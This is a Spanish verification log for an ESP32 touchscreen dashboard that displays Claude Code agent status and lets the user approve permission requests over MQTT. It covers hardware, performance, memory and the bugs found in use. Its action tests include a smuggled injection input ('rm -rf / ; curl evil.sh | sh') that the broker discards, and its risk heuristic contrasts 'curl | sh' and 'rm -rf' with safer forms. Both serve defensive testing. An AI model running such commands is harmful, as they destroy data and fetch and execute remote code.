# Registro de verificación

Qué se ha probado, cómo, y qué salió. Las cifras están medidas en la placa
real (FNK0114-S, MAC `8C:94:DF:4F:1F:3C`), no estimadas.

Fecha: 2026-09-19.

## Fase 0 — hardware

| Qué | Cómo | Resultado |
|---|---|---|
| Chip y flash | `ESP.getChipModel()` por serial | ESP32-D0WD-V3 rev 3.1, 4 MB |
| PSRAM | `ESP.getPsramSize()` | **0 B** — confirma la restricción 1 |
| Orientación | `rotation 1` | 480x320 |
| Orden de color | Tres barras etiquetadas ROJO/VERDE/AZUL | Coinciden: RGB, sin inversión |
| Táctil | Calibración + cuatro esquinas | `{315, 3592, 233, 3558, 7}`, error máx **12 px** en vértices |
| Persistencia NVS | Reflasheo y relectura | La calibración sobrevive |
| BOOT | Pulsación | `[key] BOOT pulsado` |

Trampa encontrada: `upload_speed 921600` falla a través de un dock USB-C
(`Invalid head of packet (0xE0)`). A 460800 va.

## Fase 1 — dashboard

| Qué | Cómo | Resultado |
|---|---|---|
| Cinco hooks | `curl` a cada endpoint + sesiones reales | Estado por sesión y por subagente |
| Mock | `mock-agent.ts --agents 4 --speed 5` | 4 agentes con eventos realistas |
| Retained | Suscriptor nuevo tras publicar | Recibe el estado completo al conectar |
| Purga de fantasmas | Reinicio del broker con retained previos | 6 borrados al arrancar |
| Payload | Medido sobre 4 agentes | **157 B máx** → `StaticJsonDocument<256>` sobra |
| Enrutado HTTP | `/health`, `/health/`, `/Health`, `/`, `/nope`, `/hook/stop` | 200/200/200/200/404/405 |

## Fase 2 — permisos

Las cuatro rutas, todas con el hook real del broker:

| Caso | Resultado | Tiempo |
|---|---|---|
| Riesgo bajo (`Read`) | `unspecified (risk:low)` | instantáneo, no se publica |
| Riesgo alto + respuesta | `allow`, round-trip MQTT completo | — |
| Placa apagada (LWT `0`) | `unspecified (fallback)` | **0,04 s** |
| Nadie contesta | `unspecified (timeout)` | 90 s exactos |

Ninguna deja la sesión colgada, que es el requisito que manda.

La modal se confirmó en la placa por serial:
`[ui ] modal de permiso: rm -rf /tmp/carpeta-de-prueba`.

Heurística de riesgo: `broker/tools/risk-test.ts`, **17/17**, incluidos los
pares que separan un nivel del otro (push normal vs forzado, `rm` vs `rm -rf`,
`DELETE` con y sin `WHERE`, `curl` a una API vs `curl | sh`).

## Fase 3 — avatar

Framerate medido contando refrescos completos (`lv_display_flush_is_last`),
no estimado:

| | Antes | Después |
|---|---|---|
| fps con el avatar animando | 15,6 ❌ | **23,4** ✓ |
| Píxeles por frame | 21.700 | 4.840 |
| Zonas invalidadas por frame | 5,8 | 2,3 |
| SPI | 9% | 3% |

La causa no era el bus ni el buffer: `lv_label_set_text` invalida el área
aunque el texto sea idéntico.

## Fase 4 — acciones

| Caso | Resultado |
|---|---|
| `continue` con tmux | Escribe en el panel, `ok via=tmux detail=cadtest:0.0` |
| `interrupt` con tmux | Manda `Escape`, `ok` |
| `interrupt` sin tmux | `ok:false` — "PARAR solo funciona en tmux" |
| `tests` sin tmux | Cae a `claude -p` en el directorio correcto |
| Acción desconocida (`rm -rf / ; curl evil.sh \| sh`) | Descartada en el broker, no toca nada |
| Agente desconocido | `ok:false` — "no se conoce el directorio" |

## Estabilidad

**Soak de 34,8 minutos**, 70 muestras, con WiFi y MQTT conectados:

| | |
|---|---|
| Panics | **0** |
| Deriva de `free` | **0 bytes** (167.784 B constante) |
| Deriva de `largest_free_block` | **0 bytes** (110.580 B constante) |
| Pool de LVGL | 62–63%, estable |

No hay fuga: los valores no se mueven ni un byte en media hora.

**Reconexión de MQTT con backoff**, matando Mosquitto y volviéndolo a arrancar:

```
   3s [mqtt] desconectado
   3s [mqtt] fallo rc=-2 (intento 1), reintento en 2000 ms
   5s [mqtt] fallo rc=-2 (intento 2), reintento en 4000 ms
   9s [mqtt] fallo rc=-2 (intento 3), reintento en 8000 ms
  17s [mqtt] fallo rc=-2 (intento 4), reintento en 16000 ms
  33s [mqtt] fallo rc=-2 (intento 5), reintento en 30000 ms
  63s [mqtt] conectado a 192.168.4.28:1883
```

Exponencial con tope de 30 s, y **sin reiniciar la placa**. Al reconectar
recibe los retained y repinta.

## Operación (2026-09-20)

| Qué | Cómo | Resultado |
|---|---|---|
| Supervivencia sin tocar nada | 20 h con Mosquitto y broker corriendo | Placa online, 0 incidencias |
| `KeepAlive` de launchd | `kill -9` al broker y a Mosquitto | Ambos resucitan en <15 s |
| Disparador de permiso | `bun run tools/test-permission.ts` | Modal en pantalla 90 s, timeout limpio |
| Atenuado del panel | 2 min sin actividad | `[bl ] pantalla atenuada` |
| Apagado del panel | 12 min sin actividad | `[bl ] pantalla apagada` |

## Fallos encontrados al usarlo de verdad (2026-09-20)

Tres, encadenados, y ninguno visible en las pruebas de ayer porque el broker
corría desde una terminal y no como servicio.

1. **`Bun.spawn` lanza excepción si el binario no existe y no la capturaba.**
   La excepción subía por el handler async, nadie la recogía y el proceso
   moría. Cada pulsación de un botón tumbaba el broker; launchd lo resucitaba.
   Once arranques en el log antes de verlo.
2. **launchd arranca con `PATH` mínimo**, sin `/opt/homebrew/bin`. `tmux` y
   `claude` no se encontraban — solo como servicio, que es como corre ahora.
3. **El separador de campos se perdía entre el fuente y tmux.** Los tres
   campos llegaban pegados, ningún panel casaba nunca y toda acción caía a
   `claude -p` en silencio. Probado con tabulador y con `\x1f`, fallaba igual;
   se resolvió pidiendo un campo por llamada, sin separador que perder.

Ahora, verificado bajo launchd: `via: tmux`, `detail: cadt3:0.0`, la frase
escrita en el panel y el broker sigue vivo.

## Memoria

| Momento | `free` | `largest_free_block` |
|---|---|---|
| Arranque, binario sin WiFi | 342 KB | 111 KB |
| Con WiFi asociado (fase 1) | 253 KB | 107 KB |
| Con LVGL, 4 pantallas y MQTT | 163 KB | **107 KB** |

Suelo del presupuesto: 80 KB de `largest`. `free` no sirve como métrica: el
heap del ESP32 está partido en regiones no contiguas.

El pool de LVGL es un segundo presupuesto, aparte, y se agota en silencio:

| `LV_MEM_SIZE` | Uso | `largest` | Veredicto |
|---|---|---|---|
| 24 KB | 100% | — | **Panic en el arranque, en bucle** |
| 64 KB | 38% | 71 KB | Arranca, pero rompe el suelo de 80 KB |
| **40 KB** | **63%** | **107 KB** | Elegido |

Ahora sale en cada log periódico con aviso al pasar del 80%.

## Lo que no se ha podido probar

- **La pulsación física de BOOT** confirmando un permiso. Requiere un dedo.
- **El modal disparado por un agente real.** El hook solo se dispara cuando
  Claude Code iba a preguntar; en modo `auto` eso es solo lo destructivo, y no
  se puede provocar sin destruir algo de verdad.
- **Legibilidad del texto de 12 px** en el panel TN. Requiere un ojo.
